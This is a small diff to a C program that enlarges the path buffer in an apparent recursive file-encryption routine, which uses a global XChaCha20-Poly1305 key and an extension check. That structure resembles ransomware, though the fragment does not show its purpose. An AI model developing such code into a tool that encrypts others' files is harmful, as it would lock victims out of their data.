@@ -104,7 +104,7 @@ int check_extension(const char *str, const char *suffix) {
 
 unsigned char enc_key[crypto_secretbox_xchacha20poly1305_KEYBYTES];
 void encryptRecursively(char *basePath) {
-    char path[1000];
+    char path[4096];
     struct dirent *dp;
     DIR *dir = opendir(basePath);
 
